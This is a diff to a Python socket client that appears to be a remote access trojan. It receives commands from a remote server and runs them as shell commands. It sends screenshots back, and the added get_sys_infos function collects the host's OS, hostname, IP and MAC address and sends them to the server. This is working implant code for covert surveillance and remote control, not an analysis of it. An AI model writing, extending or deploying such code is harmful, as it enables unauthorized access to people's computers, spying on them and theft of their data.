@@ -1,3 +1,5 @@
+import json
+import re
 import socket
 import subprocess
 import select
@@ -6,6 +8,8 @@ from datetime import datetime
 import os
 import base64
 import textwrap
+import platform
+import uuid
 
 import numpy as np
 from mss import mss # Multiple ScreenShot
@@ -37,14 +41,16 @@ def send_data(sock: socket.socket, msg):
         print('The server closed the connection')
 
 
+# return a list of one or more packets from 1024 to 8192 bytes long.  
+# 8192 bytes long packet are for images
 def packet_crafting(msg: str):
     HEADER = 8192
     data_size = len(msg) + 4 # Plus the header
     packets = []
-    if (data_size > HEADER) :
+    if (data_size > HEADER) : # image
         packets = img_to_packets(msg)
     
-    else :
+    else : # message
         packet_size = int((np.ceil(data_size/1024)*1024))
         msg_encoded = msg.encode('utf-8')
         header_encoded = packet_size.to_bytes(4, 'little')
@@ -73,6 +79,8 @@ def b64_to_txt(b64): # debug
     with open('img_b64.txt', 'wb') as fs:
         fs.write(b64)
 
+
+# Features 
 def send_screenshot(sock: socket.socket):
     with mss() as sct:
         sct.compression_level = 9 # max compression = +- 50 000 bytes file
@@ -93,12 +101,32 @@ def send_screenshot(sock: socket.socket):
             send_data(sock, string_chunking)
 
 
+# https://stackoverflow.com/a/58420504 
+def get_sys_infos(sock: socket.socket) :
+    try:
+        info={}
+        info['platform']=platform.system()
+        info['platform-release']=platform.release()
+        info['platform-version']=platform.version()
+        info['architecture']=platform.machine()
+        info['hostname']=socket.gethostname()
+        info['ip-address']=socket.gethostbyname(socket.gethostname())
+        info['mac-address']=':'.join(re.findall('..', '%012x' % uuid.getnode()))
+        
+        data = json.dumps(info)
+        send_data(sock, data)
+    except Exception as e:
+        print(f'Error when retreiving system infos :\n{e}')
+
+
 def get_data(sock: socket.socket):
     try: 
         res = sock.recv(1024).decode('utf-8')
         print(f'Server response : {res}')
         if res == 'screenshot':
             send_screenshot(sock)
+        elif res == 'get_sys_infos' :
+            get_sys_infos(sock)
         elif res != 'Alive ping back received':
             command = res.split(' ')
             res = exec_command(command)
